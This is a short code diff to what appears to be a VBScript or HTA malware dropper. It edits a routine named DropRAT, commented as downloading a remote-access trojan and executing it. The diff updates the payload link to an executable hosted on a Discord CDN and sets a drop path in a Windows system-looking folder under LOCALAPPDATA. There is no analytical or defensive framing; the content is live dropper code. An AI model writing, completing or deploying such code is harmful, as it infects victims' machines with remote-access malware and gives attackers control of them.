@@ -43,8 +43,9 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Standard Download to Disk) ---
+' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
+    ' Updated RAT Link
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572764410202693664/client_10.exe?ex=6aff8e7f&is=6afe3cff&hm=8cecb094312df98931f68499bcc7013bf7c20990176268e7887e512d1301da39&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
